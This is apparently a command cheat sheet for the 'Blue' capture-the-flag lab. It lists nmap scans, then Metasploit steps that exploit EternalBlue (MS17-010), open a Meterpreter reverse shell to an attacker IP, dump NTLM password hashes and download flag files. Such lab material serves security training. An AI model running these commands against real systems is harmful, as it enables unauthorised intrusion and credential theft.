# Blue — Commands

| Command | Description |
|---------|-------------|
| `nmap -sV <target>` | Scan for open ports and service versions |
| `nmap -p 445 <target>` | Scan only SMB port |
| `nmap --script=smb-vuln-ms17-010 <target>` | Check for the EternalBlue vulnerability |
| `msfconsole` | Launch the Metasploit console |
| `use exploit/windows/smb/ms17_010_eternalblue` | Load the EternalBlue exploit module |
| `set RHOSTS <target>` | Set the target IP address |
| `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Set the payload to a 64-bit Meterpreter reverse shell |
| `set LHOST <attacker_ip>` | Set the attacker's IP for the reverse connection |
| `set LPORT <attacker_port>` | Set the port for the reverse connection |
| `check` | Verify the target is vulnerable |
| `exploit` | Execute the exploitation |
| `sysinfo` | Display target system information |
| `getuid` | Display current user (should be NT AUTHORITY\SYSTEM) |
| `hashdump` | Extract NTLM password hashes |
| `shell` | Drop into a Windows command shell |
| `search -f *flag*` | Search for files named with "flag" |
| `download <remote_file>` | Download a flag file to the attacker's machine |
| `show options` | Display current module settings |
